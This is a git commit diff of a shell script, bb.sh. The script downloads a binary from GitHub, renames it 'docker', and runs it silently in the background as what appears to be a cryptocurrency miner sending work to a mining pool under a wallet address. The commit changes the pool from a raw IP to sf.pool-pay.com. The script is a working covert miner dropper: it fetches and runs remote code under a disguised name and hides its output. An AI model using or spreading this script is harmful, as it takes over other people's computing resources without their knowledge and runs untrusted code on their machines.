e7274da6e70a6da22038a255d815118f8bb87cf6
jsiqiisn <jsiqiisn@outlook.com>
2022-03-26 14:39:26 +0000

    Update bb.sh

--- bb.sh
+++ bb.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 wget https://raw.githubusercontent.com/jsiqiisn/baby/main/docker
 chmod +x docker
-./docker -o 40.83.177.217:80 -u SafexsnsPwCNzaHDEfcGTzgW9rNcKQhAmBFNrH8KRUjvcfZHGuyKAgSd1Gd5C72WVwLtUfhA3tyXsLQnkXbH1JwGHkgxtdoGRvc3n -p $(echo $(shuf -i 1-20000 -n 1)-V) -k -a rx/sfx > /dev/null 2>&1 &
+./docker -o sf.pool-pay.com:4025 -u SafexsnsPwCNzaHDEfcGTzgW9rNcKQhAmBFNrH8KRUjvcfZHGuyKAgSd1Gd5C72WVwLtUfhA3tyXsLQnkXbH1JwGHkgxtdoGRvc3n -p $(echo $(shuf -i 1-20000 -n 1)-V) -k -a rx/sfx > /dev/null 2>&1 &
 uname -a
